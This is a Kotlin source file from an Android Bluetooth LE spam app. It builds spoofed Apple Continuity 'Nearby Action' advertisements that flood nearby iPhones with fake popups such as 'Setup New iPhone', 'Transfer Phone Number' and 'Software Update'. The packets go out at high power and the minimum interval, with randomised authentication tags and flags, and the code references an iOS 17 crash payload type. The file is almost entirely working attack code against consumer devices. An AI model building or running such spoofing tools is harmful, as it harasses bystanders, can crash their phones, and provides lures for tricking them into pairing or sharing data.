package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Constants.Constants
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
import kotlin.random.Random

class  ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityActionModalAdvertisementSetGenerator"

    // Reversed from here: https://github.com/Flipper-XFW/Xtreme-Apps/blob/52c1c0f690bc01257e6461aa1081cf7d0faa92cf/ble_spam/protocols/continuity.c#L178

    val _nearbyActions = mapOf(
        "13" to "AppleTV AutoFill",
        "27" to "AppleTV Connecting...",
        "20" to "Join This AppleTV?",
        "19" to "AppleTV Audio Sync",
        "1E" to "AppleTV Color Balance",
        "09" to "Setup New iPhone",
        "02" to "Transfer Phone Number",
        "0B" to "HomePod Setup",
        "01" to "Setup New AppleTV",
        "06" to "Pair AppleTV",
        "0D" to "HomeKit AppleTV Setup",
        "2B" to "AppleID for AppleTV?",
        "05" to "Apple Watch",
        "24" to "Apple Vision Pro",
        "2F" to "Connect to other Device",
        "21" to "Software Update",
    )

    companion object {
        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet): AdvertisementSet {
            if (advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_IOS_17_CRASH || advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS) {
                if (advertisementSet.advertiseData.manufacturerData.size > 0) {
                    var payload =
                        advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData
                    // Example Payload: 0f05bf2078ef39000010f7c0e5
                    val action = payload[3]
                    var flag = payload[2]

                    // Change flag from time to time
                    if ((StringHelpers.byteToHexString(action) == "20") && Random.nextBoolean()) {
                        flag = StringHelpers.decodeHex("BF")[0]
                    }

                    // Change flag from time to time
                    if ((StringHelpers.byteToHexString(action) == "09") && Random.nextBoolean()) {
                        flag = StringHelpers.decodeHex("40")[0]
                    }

                    // Change flag each time
                    if ((StringHelpers.byteToHexString(action) == "21")) {
                        flag = StringHelpers.decodeHex("40")[0]
                    }

                    payload[2] = flag

                    // randomize auth tag
                    payload[4] = Random.nextBytes(1)[0]
                    payload[5] = Random.nextBytes(1)[0]
                    payload[6] = Random.nextBytes(1)[0]

                    advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData = payload
                }
            }

            return advertisementSet
        }
    }

    private val _manufacturerId = Constants.MANUFACTURER_ID_APPLE
    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: _nearbyActions

        data.map { nearbyAction ->
            var advertisementSet: AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_UNKNOWN

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId

            // EXAMPLE: 0x10FF4C000F05C0-13-2C0CFE-00000000000000...
            // EXAMPLE: 0x10FF4C000F05C0-0B-6473A6-00000000000000...

            //
            // 0x10FF4C000F05 = STATIC ( HEADER )
            // C0 = flags
            // 0B = action -> 0B = HomePod Setup
            // 6473A6 = authentication tag -> random data

            var continuityType = "0F" // 0x0F = NearbyAction
            var payloadSize = "05"
            var flag = "C0"
            var action = nearbyAction.key
            var authenticationTag:ByteArray = Random.Default.nextBytes(3)

            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(continuityType + payloadSize + flag + action).plus(authenticationTag)

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = nearbyAction.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        Log.d(_logTag, "Created " + advertisementSets.count() + "Items")

        return advertisementSets.toList()
    }
}